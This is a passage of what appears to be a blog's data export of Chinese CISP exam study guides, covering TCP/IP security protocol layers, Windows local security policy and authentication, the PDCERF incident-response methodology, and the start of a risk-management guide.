TCP/IP协议栈安全协议分层： graph TB A[\"TCP/IP协议栈\"] B[\"应用层\"] C[\"传输层\"] D[\"网络层\"] E[\"数据链路层\"] A --> B A --> C A --> D A --> E B --> B1[\"HTTPS\"] B --> B2[\"SSH\"] B --> B3[\"SFTP\"] C --> C1[\"SSL/TLS ✅\"] C --> C2[\"安全套接字层\"] D --> D1[\"IPsec\"] D --> D2[\"IP安全协议\"] E --> E1[\"L2TP\"] E --> E2[\"PP2P\"] E --> E3[\"PPTP\"] style C fill:#e3f2fd,stroke:#1976d2 style D fill:#fff3e0,stroke:#f57c00 style E fill:#e8f5e9,stroke:#388e3d 4.2 各层安全协议详解 传输层安全协议：SSL/TLS 🔐 SSL/TLS（传输层）SSL（Secure Sockets Layer）/ TLS（Transport Layer Security） 📍 位置：传输层 位于TCP和应用层之间 为应用层协议提供安全服务 🎯 主要功能： 数据加密传输 服务器身份认证 客户端身份认证（可选） 数据完整性保护 💼 典型应用： HTTPS（HTTP over SSL/TLS） SMTPS（邮件传输） FTPS（文件传输） 网络层安全协议：IPsec 🛡️ IPsec（网络层）IPsec（Internet Protocol Security） 📍 位置：网络层 在IP层实现 对IP数据包进行保护 🎯 主要功能： IP数据包加密 数据源认证 数据完整性验证 防重放攻击 💼 典型应用： VPN（虚拟专用网） 站点到站点连接 远程访问 数据链路层安全协议：L2TP、PP2P 🔗 L2TP/PP2P（数据链路层）L2TP（Layer 2 Tunneling Protocol） 📍 位置：数据链路层 第二层隧道协议 通常与IPsec结合使用 🎯 主要功能： 建立隧道连接 封装PPP帧 支持多协议 PP2P/PPTP（Point-to-Point Tunneling Protocol） 📍 位置：数据链路层 点对点隧道协议 较早的VPN协议 💼 典型应用： 远程拨号VPN 企业远程访问 4.3 安全协议层次对比 各层安全协议对比表： 协议 所属层次 保护范围 优势 劣势 典型应用 SSL/TLS 传输层 应用数据 易部署、广泛支持 只保护应用层 HTTPS、邮件 IPsec 网络层 IP数据包 透明、全面保护 配置复杂 VPN、站点互联 L2TP 数据链路层 链路层帧 支持多协议 需配合IPsec 远程访问VPN PP2P/PPTP 数据链路层 PPP连接 简单易用 安全性较弱 旧式VPN 协议选择建议： 安全协议选择指南： ├── Web应用安全 │ └── 推荐：SSL&#x2F;TLS（HTTPS） ├── 站点到站点VPN │ └── 推荐：IPsec ├── 远程访问VPN │ ├── 推荐：L2TP&#x2F;IPsec │ └── 备选：SSL VPN └── 移动办公 └── 推荐：SSL VPN或IPsec 4.4 协议层次记忆技巧 💡 记忆技巧按层次记忆： 🔝 传输层：SSL/TLS S开头：Socket（套接字） 在TCP之上 为应用提供安全 🌐 网络层：IPsec IP开头：IP层协议 保护IP数据包 VPN常用 🔗 数据链路层：L2TP、PP2P L2：Layer 2（第二层） PP：Point-to-Point（点对点） 链路层隧道 五、总结 安全机制、密码协议与数字签名的核心要点： 安全机制：多层防御，每层包含保护和检测两种手段 密码协议：必须明确定义所有步骤，不能模糊处理 数字签名：解决篡改和伪造问题，但不提供加密 TCP/IP安全协议：SSL/TLS（传输层）、IPsec（网络层）、L2TP/PP2P（数据链路层） 🎯 关键要点 即使最好的安全产品也存在安全缺陷 应配备多种安全机制形成深度防御 每种安全机制应包括保护和检测两种手段 密码协议必须明确定义所有步骤和处理方式 复杂步骤更需要明确，不能模糊处理 密码协议参与方可能完全信任或完全不信任 数字签名基于数据内容，与数据密切相关 数字签名使用非对称加密，不是对称加密 数字签名能解决篡改、伪造等问题 数字签名不能解决加密传输问题 SSL/TLS属于传输层安全协议 IPsec属于网络层安全协议 L2TP、PP2P属于数据链路层安全协议 💡 实践建议 实施多层安全防御策略 每层部署保护和检测机制 设计密码协议时明确所有步骤 对复杂步骤进行详细定义 根据信任关系选择合适的协议 正确使用数字签名提供认证 结合加密和签名实现完整安全 定期审查和更新安全机制","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：Windows操作系统安全配置","slug":"2025/10/CISP-Windows-Security-Configuration-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Windows-Security-Configuration/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Windows-Security-Configuration/","excerpt":"深入解析CISP认证中的Windows操作系统安全配置，包括本地安全策略的四大类别和配置实践。","text":"Windows操作系统安全配置是系统安全加固的重要组成部分，通过配置本地安全策略可以有效提升系统安全性。 一、Windows本地安全策略 1.1 本地安全策略概述 Windows操作系统提供了&quot;本地安全策略&quot;功能，用于配置系统的安全设置。 🖥️ Windows本地安全策略本地安全策略包括四类： 账号策略 密码策略 账户锁定策略 Kerberos策略 本地策略 审核策略 用户权限分配 安全选项 公钥策略 加密文件系统 数据保护 IP安全策略 IPsec规则 网络通信保护 graph TB A[\"Windows本地安全策略\"] B[\"账号策略\"] C[\"本地策略\"] D[\"公钥策略\"] E[\"IP安全策略\"] A --> B A --> C A --> D A --> E B --> B1[\"密码策略\"] B --> B2[\"账户锁定策略\"] B --> B3[\"Kerberos策略\"] C --> C1[\"审核策略\"] C --> C2[\"用户权限分配\"] C --> C3[\"安全选项\"] D --> D1[\"加密文件系统\"] D --> D2[\"数据保护\"] E --> E1[\"IPsec规则\"] E --> E2[\"网络通信保护\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 二、安全配置的分类 2.1 操作系统安全配置内容 操作系统安全配置包括四大类： graph TB A[\"操作系统安全配置\"] B[\"制定安全策略\"] C[\"关闭不必要的服务\"] D[\"关闭不必要的端口\"] E[\"查看日志记录\"] A --> B A --> C A --> D A --> E B --> B1[\"账号策略\"] B --> B2[\"本地策略\"] B --> B3[\"公钥策略\"] B --> B4[\"IP安全策略\"] C --> C1[\"禁用不需要的服务\"] D --> D1[\"防火墙规则\"] E --> E1[\"审计日志\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 2.2 配置类型说明 配置Windows本地安全策略属于&quot;制定安全策略&quot;： 配置类型 说明 示例 制定安全策略 ✅ 配置系统安全规则和要求 本地安全策略配置 关闭不必要的服务 禁用不需要的系统服务 禁用Telnet服务 关闭不必要的端口 通过防火墙关闭端口 关闭135、139端口 查看日志记录 审计和监控系统活动 查看安全日志 正确答案：C. 制定安全策略 三、Windows安全策略配置实践 3.1 账号策略配置 密码策略配置示例： 密码策略： ├── 密码必须符合复杂性要求：启用 ├── 密码长度最小值：12个字符 ├── 密码最长使用期限：90天 ├── 密码最短使用期限：1天 ├── 强制密码历史：记住24个密码 └── 用可还原的加密来存储密码：禁用 账户锁定策略配置示例： 账户锁定策略： ├── 账户锁定阈值：5次无效登录 ├── 账户锁定时间：30分钟 └── 重置账户锁定计数器：30分钟 3.2 审核策略配置 审核策略配置示例： 审核策略： ├── 审核账户登录事件：成功和失败 ├── 审核账户管理：成功和失败 ├── 审核登录事件：成功和失败 ├── 审核对象访问：失败 ├── 审核策略更改：成功和失败 ├── 审核特权使用：失败 ├── 审核系统事件：成功和失败 └── 审核目录服务访问：失败 3.3 配置步骤 访问本地安全策略： 按 Win + R 打开运行对话框 输入 secpol.msc 并回车 在本地安全策略窗口中配置相应策略 四、Windows身份鉴别机制 4.1 Windows身份鉴别组件 Windows身份鉴别三大组件： graph LR A[\"Windows身份鉴别系统\"] B[\"LSA本地安全授权机构\"] C[\"SAM安全账户管理器\"] D[\"SID安全标识符\"] A --> B A --> C A --> D B --> B1[\"生成SID\"] B --> B2[\"管理安全策略\"] B --> B3[\"验证用户身份\"] C --> C1[\"存储用户信息\"] C --> C2[\"以SYSTEM权限运行\"] C --> C3[\"管理密码更改\"] D --> D1[\"唯一标识用户\"] D --> D2[\"用于访问控制\"] D --> D3[\"不可更改\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 4.2 LSA（本地安全授权机构） LSA的主要职责： LSA（Local Security Authority）职责： ├── 1. 生成SID │ ├── 为新用户生成唯一SID │ ├── 为新组生成唯一SID │ └── 确保SID在系统内唯一 ├── 2. 管理安全策略 │ ├── 密码策略 │ ├── 账户锁定策略 │ └── 审核策略 ├── 3. 验证用户身份 │ ├── 本地登录验证 │ ├── 远程登录验证 │ └── 生成访问令牌 └── 4. 管理安全事件 ├── 记录安全日志 └── 处理安全事件 4.3 SAM（安全账户管理器） SAM服务的关键特点： ⚠️ 关键误区错误说法：SAM服务以Administrator权限运行 ❌ 问题： SAM服务以SYSTEM权限运行 不是Administrator权限 SYSTEM是Windows最高权限 ✅ 正确理解： SYSTEM权限 &gt; Administrator权限 SYSTEM是系统级账户 用于运行核心系统服务 Windows权限级别对比： 账户类型 权限级别 说明 用途 SYSTEM ⭐⭐⭐⭐⭐ 最高 系统级账户 系统服务 Administrator ⭐⭐⭐⭐ 高 管理员账户 系统管理 Power Users ⭐⭐⭐ 中 高级用户 部分管理 Users ⭐⭐ 低 普通用户 日常使用 Guest ⭐ 最低 访客账户 临时访问 SAM服务的主要功能： SAM（Security Accounts Manager）功能： ├── 1. 存储用户信息 │ ├── 用户名 │ ├── 密码哈希 │ ├── SID │ └── 组成员身份 ├── 2. 管理密码更改 │ ├── 验证旧密码 │ ├── 检查密码策略 │ └── 存储新密码哈希 ├── 3. 账户管理 │ ├── 创建用户 │ ├── 删除用户 │ └── 修改用户属性 └── 4. 运行权限 └── 以SYSTEM权限运行（不是Administrator） 4.4 SID（安全标识符） SID的结构： 🆔 SID结构SID（Security Identifier）组成： S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-RID │ │ │ │ │ │ │ │ │ │ │ │ │ └─ RID（相对标识符） │ │ │ └────────────┴────────────┴──────────── 域&#x2F;计算机标识符 │ │ └─ 标识符权限 │ └─ 修订级别 └─ 前缀 **不包含：** - ❌ 48比特身份特权 - ❌ 用户和组的安全描述 - ❌ 可变的验证值 常见的RID值： RID 账户 说明 500 Administrator 管理员账户 501 Guest 访客账户 502 KRBTGT Kerberos服务账户 512 Domain Admins 域管理员组 513 Domain Users 域用户组 4.5 Windows远程登录鉴别机制演进 Windows远程登录鉴别机制的发展历程： graph LR A[\"SMB鉴别机制\"] --> B[\"LM鉴别机制\"] B --> C[\"NTLM鉴别机制\"] C --> D[\"Kerberos鉴别体系\"] A --> A1[\"早期阶段\"] B --> B1[\"安全性弱\"] C --> C1[\"安全性提升\"] D --> D1[\"现代标准\"] style A fill:#ffebee,stroke:#c62828 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#e3f2fd,stroke:#1976d2 各阶段特点对比： 阶段 时期 安全性 特点 状态 SMB 1980s ⭐ 很弱 明文传输密码 已废弃 LM 1990s ⭐⭐ 弱 密码哈希弱 已废弃 NTLM 1993+ ⭐⭐⭐ 中 改进的哈希 兼容使用 Kerberos 2000+ ⭐⭐⭐⭐⭐ 高 票据认证、相互认证 现代标准 鉴别机制详解： Windows远程登录鉴别机制演进： ├── 1. SMB鉴别机制（早期） │ ├── 明文传输密码 │ ├── 极不安全 │ └── 已废弃 ├── 2. LM鉴别机制（LAN Manager） │ ├── 使用LM哈希 │ ├── 密码分为7字符两段 │ ├── 容易被破解 │ └── Windows Vista后默认禁用 ├── 3. NTLM鉴别机制（NT LAN Manager） │ ├── 使用MD4哈希 │ ├── 安全性有所提升 │ ├── 仍用于兼容性 │ └── 工作组环境使用 └── 4. Kerberos鉴别体系（现代） ├── Windows 2000后默认 ├── 票据认证机制 ├── 支持相互认证 ├── 支持单点登录 └── Active Directory域环境使用 五、总结 Windows操作系统安全配置的核心要点： 🎯 关键要点 Windows本地安全策略包括账号策略、本地策略、公钥策略、IP安全策略 配置本地安全策略属于&quot;制定安全策略&quot;范畴 密码策略应强制复杂性要求和定期更换 账户锁定策略可防止暴力破解 审核策略用于监控系统安全事件 LSA生成SID，SID在系统内唯一 SAM服务以SYSTEM权限运行，不是Administrator权限 Windows远程登录鉴别机制演进：SMB→LM→NTLM→Kerberos SID不包含48比特身份特权，只包含标识信息 💡 实践建议 定期审查和更新操作系统安全配置 实施强密码策略和账户锁定策略 启用审核策略，监控系统安全事件 关闭不必要的服务和端口 定期查看安全日志","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：安全事件应急响应与PDCERF方法论","slug":"2025/10/CISP-Incident-Response-PDCERF-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Incident-Response-PDCERF/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Incident-Response-PDCERF/","excerpt":"深入解析CISP认证中的安全事件应急响应，重点讲解PDCERF六阶段方法论和事件处理最佳实践。","text":"安全事件应急响应是组织安全管理的重要组成部分，PDCERF方法论提供了系统化的事件处理框架，帮助组织有效应对安全事件。 一、安全事件应急响应概述 1.1 什么是安全事件应急响应 🚨 应急响应定义**安全事件应急响应（Incident Response）**是指组织在安全事件发生时，采取的一系列有组织、有计划的活动，以快速检测、分析、遏制、消除和恢复安全事件。 核心目标： 快速检测和响应安全事件 最小化损失和负面影响 恢复正常业务运营 防止类似事件再次发生 收集证据用于后续分析 1.2 应急响应的重要性 为什么需要应急响应： ⏱️ 减少事件响应时间 💰 降低经济损失 🛡️ 保护组织声誉 📋 满足合规要求 📚 积累安全经验 🔄 持续改进安全能力 没有应急响应计划的后果： 问题 影响 响应混乱 延误处理时机 职责不清 相互推诿 流程缺失 处理不当 证据丢失 无法追溯 损失扩大 影响业务 二、PDCERF方法论 2.1 PDCERF六阶段模型 📊 PDCERF方法论PDCERF是一种广泛使用的安全事件应急响应方法论，将应急响应分成六个阶段： P - Preparation（准备阶段） D - Detection（检测阶段） C - Containment（遏制阶段） E - Eradication（根除阶段） R - Recovery（恢复阶段） F - Follow-up（跟踪阶段） graph LR A[\"P准备Preparation\"] B[\"D检测Detection\"] C[\"C遏制Containment\"] D[\"E根除Eradication\"] E[\"R恢复Recovery\"] F[\"F跟踪Follow-up\"] A --> B B --> C C --> D D --> E E --> F F -.->|\"持续改进\"| A style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffcdd2,stroke:#c62828 style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#e1f5fe,stroke:#0277bd 2.2 准备阶段（Preparation） 🎯 准备阶段**目标：**在事件发生前做好充分准备，建立应急响应能力。 核心活动： 制定应急响应计划 组建应急响应团队 部署监控和检测工具 进行培训和演练 准备应急资源 准备阶段的关键工作： 工作内容 说明 产出 制定计划 编写应急响应计划和流程 应急响应手册 组建团队 明确角色和职责 应急响应团队 工具部署 部署监控、分析工具 安全监控平台 培训演练 定期培训和桌面推演 培训记录、演练报告 资源准备 准备备份、备件等 应急资源清单 应急响应团队角色： 应急响应团队： ├── 事件响应经理 │ └── 统筹协调、决策指挥 ├── 安全分析师 │ └── 事件分析、威胁研判 ├── 系统管理员 │ └── 系统操作、配置变更 ├── 网络工程师 │ └── 网络隔离、流量分析 ├── 法务顾问 │ └── 法律咨询、合规指导 └── 公关人员 └── 对外沟通、声明发布 准备阶段的最佳实践： ✅ 定期更新应急响应计划 ✅ 每季度进行一次演练 ✅ 建立事件分类和优先级标准 ✅ 准备应急联系人清单 ✅ 建立与外部机构的联系渠道 2.3 检测阶段（Detection） 🔍 检测阶段**目标：**及时发现安全事件的发生。 核心活动： 监控安全告警 分析异常行为 识别安全事件 初步评估影响 启动应急响应 检测的来源： graph TB A[\"安全事件检测\"] B[\"自动检测\"] C[\"人工发现\"] D[\"外部通报\"] A --> B A --> C A --> D B --> B1[\"IDS/IPS告警\"] B --> B2[\"SIEM关联分析\"] B --> B3[\"防病毒软件\"] B --> B4[\"异常流量检测\"] C --> C1[\"用户报告\"] C --> C2[\"管理员发现\"] C --> C3[\"审计发现\"] D --> D1[\"安全厂商通报\"] D --> D2[\"执法机构通知\"] D --> D3[\"合作伙伴告知\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 事件分类和优先级： 优先级 事件类型 响应时间 示例 P1 - 紧急 严重影响业务 15分钟内 勒索软件、数据泄露 P2 - 高 重大安全威胁 1小时内 APT攻击、系统入侵 P3 - 中 一般安全事件 4小时内 病毒感染、钓鱼邮件 P4 - 低 轻微安全问题 24小时内 策略违规、弱密码 检测阶段的关键指标： ⏱️ 平均检测时间（MTTD）：从事件发生到被检测的时间 🎯 检测准确率：真实事件占告警总数的比例 📊 误报率：误报占告警总数的比例 ⚠️ 常见问题检测阶段的挑战： 告警过多，难以处理 误报率高，影响效率 缺乏关联分析能力 检测能力覆盖不足 响应时间过长 2.4 遏制阶段（Containment） 🛑 遏制阶段**目标：**阻止事件扩散，防止损失进一步扩大。 核心活动： 隔离受影响系统 阻断攻击路径 保护关键资产 收集证据 评估影响范围 遏制策略： 策略类型 说明 适用场景 示例 短期遏制 快速阻止扩散 紧急情况 断网、关机 长期遏制 维持业务运行 需要持续运营 网络隔离、访问限制 完全隔离 彻底切断连接 严重感染 物理隔离 部分隔离 限制特定通信 需要保留部分功能 防火墙规则 遏制措施： graph TB A[\"遏制措施\"] B[\"网络层\"] C[\"系统层\"] D[\"应用层\"] E[\"数据层\"] A --> B A --> C A --> D A --> E B --> B1[\"网络隔离\"] B --> B2[\"防火墙规则\"] B --> B3[\"流量过滤\"] C --> C1[\"禁用账号\"] C --> C2[\"关闭服务\"] C --> C3[\"系统隔离\"] D --> D1[\"应用下线\"] D --> D2[\"功能禁用\"] D --> D3[\"访问限制\"] E --> E1[\"数据备份\"] E --> E2[\"权限收回\"] E --> E3[\"加密保护\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 证据收集： 💾 系统日志和审计记录 🖼️ 系统快照和内存镜像 📁 可疑文件和恶意代码 🌐 网络流量数据 📧 相关邮件和通信记录 2.5 根除阶段（Eradication） 🔨 根除阶段**目标：**彻底清除威胁，消除安全隐患。 核心活动： 消除或阻断攻击源 找到并消除系统的脆弱性/漏洞 修改安全策略 加强防范措施 格式化被感染恶意程序的介质 清除恶意代码 修复漏洞 删除后门 重置凭证 加固系统 💡 根除阶段的典型工作在信息安全应急响应过程中，根除阶段的核心工作是彻底清除威胁。 根除阶段的典型措施： ✅ 消除或阻断攻击源 ✅ 找到并消除系统的脆弱性/漏洞 ✅ 修改安全策略 ✅ 加强防范措施 ✅ 格式化被感染恶意程序的介质 与其他阶段的区别： ❌ 准备阶段（Preparation） 事前准备工作 包括制定计划、组建团队、部署工具 不包括实际的威胁清除工作 ❌ 检测阶段（Detection） 发现和识别安全事件 包括监控告警、分析异常、确认事件 不包括清除威胁的工作 ❌ 遏制阶段（Containment） 阻止事件扩散 包括隔离系统、阻断攻击路径 主要目标是防止损失扩大，而非彻底清除 根除阶段与遏制阶段的区别： 特征 遏制阶段（Containment） 根除阶段（Eradication） 目标 阻止事件扩散 彻底清除威胁 时机 事件发生后立即进行 遏制之后进行 措施 隔离、断网、限制访问 清除恶意代码、修复漏洞、加固系统 重点 快速响应、防止扩散 彻底清除、消除隐患 持续时间 短期 可能较长 业务影响 可能影响业务 尽量减少业务影响 根除阶段的详细工作： 根除阶段工作清单： ├── 1. 消除攻击源 │ ├── 阻断攻击者的访问 │ ├── 删除攻击者账号 │ ├── 清除后门程序 │ └── 撤销被盗凭证 ├── 2. 清除恶意代码 │ ├── 使用杀毒软件清除 │ ├── 手工删除恶意文件 │ ├── 清理注册表项 │ └── 格式化被感染介质 ├── 3. 修复漏洞 │ ├── 安装安全补丁 │ ├── 修复配置错误 │ ├── 更新软件版本 │ └── 加固系统配置 ├── 4. 修改安全策略 │ ├── 更新访问控制策略 │ ├── 加强密码策略 │ ├── 调整防火墙规则 │ └── 更新安全基线 └── 5. 加强防范措施 ├── 部署额外安全控制 ├── 增强监控能力 ├── 改进检测规则 └── 加强安全培训 根除措施： 措施 说明 工具/方法 恶意代码清除 删除病毒、木马等 杀毒软件、手工清除 漏洞修复 安装补丁、修复配置 补丁管理、配置加固 后门清除 删除攻击者植入的后门 系统扫描、文件对比 凭证重置 修改密码、撤销证书 密码策略、PKI管理 系统重建 重装系统和应用 镜像恢复、自动化部署 根除验证： 验证清单： □ 恶意代码已完全清除 □ 所有漏洞已修复 □ 后门和持久化机制已删除 □ 所有凭证已重置 □ 系统配置已加固 □ 安全扫描无异常 □ 系统功能正常 2.6 恢复阶段（Recovery） 🔄 恢复阶段**目标：**恢复系统正常运行，确保业务连续性。 核心活动： 恢复系统和数据 验证系统功能 监控异常行为 逐步恢复业务 加强监控 恢复策略： graph TB A[\"恢复策略\"] B[\"数据恢复\"] C[\"系统恢复\"] D[\"业务恢复\"] E[\"监控加强\"] A --> B A --> C A --> D A --> E B --> B1[\"从备份恢复\"] B --> B2[\"数据验证\"] B --> B3[\"完整性检查\"] C --> C1[\"系统重启\"] C --> C2[\"服务启动\"] C --> C3[\"功能测试\"] D --> D1[\"分阶段恢复\"] D --> D2[\"用户通知\"] D --> D3[\"业务验证\"] E --> E1[\"增强监控\"] E --> E2[\"异常检测\"] E --> E3[\"持续观察\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 恢复步骤： 准备恢复 确认威胁已根除 准备恢复资源 制定恢复计划 执行恢复 恢复数据和系统 验证系统功能 测试业务流程 监控观察 加强安全监控 观察异常行为 确保无复发 逐步开放 先内部后外部 先核心后边缘 逐步恢复访问 恢复验证： ✅ 系统功能正常 ✅ 数据完整准确 ✅ 性能符合要求 ✅ 安全控制有效 ✅ 无异常行为 2.7 跟踪阶段（Follow-up） 📝 跟踪阶段**目标：**总结经验教训，持续改进安全能力。 核心活动： 编写事件报告 总结经验教训 改进安全措施 更新应急计划 开展培训 事件报告内容： 事件报告结构： ├── 执行摘要 │ ├── 事件概述 │ ├── 影响评估 │ └── 关键发现 ├── 事件详情 │ ├── 时间线 │ ├── 攻击手法 │ ├── 影响范围 │ └── 响应过程 ├── 根因分析 │ ├── 技术原因 │ ├── 管理原因 │ └── 人员原因 ├── 经验教训 │ ├── 做得好的 │ ├── 需改进的 │ └── 最佳实践 └── 改进建议 ├── 短期措施 ├── 中期措施 └── 长期措施 经验教训总结： 方面 问题 改进措施 检测 检测时间过长 部署更多监控点 响应 流程不清晰 更新应急手册 遏制 隔离不及时 自动化隔离 根除 清除不彻底 加强验证流程 恢复 恢复时间长 优化备份策略 持续改进： 🔄 更新应急响应计划 📚 完善知识库和手册 🛠️ 改进工具和流程 👥 加强团队培训 🔍 优化监控和检测 🤝 加强外部协作 三、应急响应最佳实践 3.1 建立应急响应能力 能力建设要素： 要素 说明 关键点 组织 建立应急响应团队 明确角色、职责、权限 流程 制定标准化流程 可操作、可度量、可改进 技术 部署必要工具 监控、分析、响应工具 人员 培养专业人才 技能培训、经验积累 演练 定期演练测试 桌面推演、实战演练 3.2 事件分类和处理 常见安全事件类型： 安全事件分类： ├── 恶意代码事件 │ ├── 病毒感染 │ ├── 木马植入 │ ├── 勒索软件 │ └── 蠕虫传播 ├── 网络攻击事件 │ ├── DDoS攻击 │ ├── 入侵渗透 │ ├── SQL注入 │ └── XSS攻击 ├── 信息泄露事件 │ ├── 数据泄露 │ ├── 账号泄露 │ ├── 内部泄密 │ └── 配置泄露 └── 违规操作事件 ├── 权限滥用 ├── 违规访问 ├── 策略违反 └── 误操作 3.3 沟通和协调 内部沟通： 📢 及时通报事件进展 👥 协调各部门配合 📋 记录沟通内容 🔒 控制信息范围 外部沟通： 🏛️ 向监管机构报告 👮 配合执法机构调查 📰 媒体和公众沟通 🤝 与安全社区协作 3.4 法律和合规 法律考虑： ⚖️ 遵守数据保护法规 📋 满足报告义务 🔍 保全证据链 📝 记录处理过程 🤝 配合调查取证 合规要求： 法规 要求 时限 网络安全法 重大事件报告 立即 数据安全法 数据泄露通知 72小时内 个人信息保护法 个人信息泄露通知 及时 等级保护 安全事件报告 按等级要求 四、应急响应工具和技术 4.1 监控和检测工具 常用工具： 🔍 SIEM：安全信息和事件管理 🛡️ IDS/IPS：入侵检测/防御系统 🌐 NDR：网络检测和响应 💻 EDR：端点检测和响应 📊 日志分析：集中日志管理 4.2 分析和取证工具 取证工具： 💾 内存取证：Volatility、Rekall 🖥️ 磁盘取证：FTK、EnCase 🌐 网络取证：Wireshark、NetworkMiner 📱 移动取证：Cellebrite、Oxygen ☁️ 云取证：云平台原生工具 4.3 自动化和编排 SOAR平台： 🤖 自动化响应流程 🔗 集成多种工具 📊 统一管理界面 📈 提高响应效率 📝 标准化操作 五、应急响应常见误区 5.1 准备阶段的误区 💡 应急响应管理过程的关键要点应急响应是信息安全事件管理的重要内容。事先制定出事件应急响应方法和过程，有助于组织在事件发生时迅速恢复控制，将损失和负面影响降到最低。 常见误解： ❌ 应急响应规划的最关键步骤 错误说法：确定重要资产和风险，实施针对风险的防护措施是最关键的步骤 这不是应急响应规划的最关键步骤 确定资产和风险是风险管理的内容 应急响应规划的最关键步骤是：制定应急响应计划和流程 应急响应关注的是事件发生后如何响应，而非事前的风险防护 各阶段的正确理解： ✅ 检测阶段 首先要进行监测、报告及信息收集 这是检测阶段的核心工作 通过监测发现安全事件，收集相关信息进行分析 确认事件并启动响应 ✅ 遏制阶段 遏制措施可能会因为事件的类别和级别不同而完全不同 常见的遏制措施有完全关闭所有系统、拔掉网线等 遏制措施需要根据具体情况选择 不同事件需要不同的遏制策略 ✅ 恢复阶段 应按照应急响应计划中事先制定的业务恢复优先顺序和恢复步骤，顺次恢复相关的系统 恢复阶段要有计划和顺序 按照业务重要性确定优先级，先恢复核心业务系统，逐步恢复其他系统 应急响应 vs 风险管理： graph TB A[\"信息安全管理\"] B[\"风险管理事前预防\"] C[\"应急响应事中事后处理\"] A --> B A --> C B --> B1[\"识别资产和风险\"] B --> B2[\"实施防护措施\"] B --> B3[\"降低风险\"] C --> C1[\"制定响应计划\"] C --> C2[\"检测和响应事件\"] C --> C3[\"恢复和改进\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 应急响应规划的关键步骤： 步骤 内容 重要性 制定应急响应计划 定义流程、角色、职责 ⭐⭐⭐⭐⭐ 最关键 组建应急响应团队 明确人员和分工 ⭐⭐⭐⭐⭐ 建立沟通机制 内外部沟通渠道 ⭐⭐⭐⭐ 准备应急资源 工具、备份、备件 ⭐⭐⭐⭐ 培训和演练 提升响应能力 ⭐⭐⭐⭐ 确定资产和风险 了解保护对象 ⭐⭐⭐ 重要但非最关键 为什么确定资产和风险不是最关键步骤： 🎯 正确理解风险管理的工作： 识别重要资产 评估风险 实施防护措施 目标：预防事件发生 应急响应的工作： 制定响应计划和流程 组建响应团队 准备响应工具 目标：事件发生后快速有效响应 关系： 风险管理是事前预防 应急响应是事中事后处理 两者互补，但关注点不同 应急响应假设事件已经发生或即将发生 六、总结 PDCERF应急响应方法论的核心要点： 六个阶段：准备、检测、遏制、根除、恢复、跟踪 准备是基础：事前准备决定响应效果 检测要及时：快速发现是关键 遏制要果断：防止损失扩大 根除要彻底：消除所有威胁 恢复要谨慎：确保安全后再恢复 跟踪要认真：总结经验持续改进 🎯 关键要点 PDCERF包含六个阶段：P-D-C-E-R-F **检测（Detection）**是发现事件的阶段 每个阶段都有明确的目标和活动 应急响应是一个循环改进的过程 准备阶段的工作决定响应的效果 💡 考试提示 记住PDCERF六个阶段的顺序和英文缩写 理解每个阶段的核心目标和主要活动 检测阶段不是&quot;培训&quot;、&quot;文档&quot;或&quot;报告&quot; 跟踪阶段的重点是总结和改进 应急响应是持续循环的过程 相关资源： NIST SP 800-61 - 计算机安全事件处理指南 ISO/IEC 27035 - 信息安全事件管理","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：风险管理、威胁建模与安全设计","slug":"2025/10/CISP-Risk-Threat-Security-Design-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Risk-Threat-Security-Design/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Risk-Threat-Security-Design/","excerpt":"深入解析CISP认证中的风险管理、Windows SID、STRIDE威胁建模、木马防护、应急响应和安全设计原则等核心知识点。","text":"本指南涵盖CISP认证中的风险管理、威胁建模、系统安全、应急响应和安全设计原则等关键领域的核心知识点。 一、风险管理 1.1 风险定义 📚 风险定义（GB/T 22081）风险是事态的概率及其结果的组合。 风险的目标可能有很多不同方面： 财务目标 健康和人身安全目标 信息安全目标 环境目标等 目标也可能有不同级别： 战略目标 组织目标 项目目标 产品目标 过程目标等 1.2 风险要素关系模型 🔍 ISO/IEC 13335-1 风险要素关系风险由以下要素组成： 资产（Assets）：需要保护的对象 威胁（Threats）：可能造成损害的潜在原因 脆弱性（Vulnerabilities）：可被威胁利用的弱点 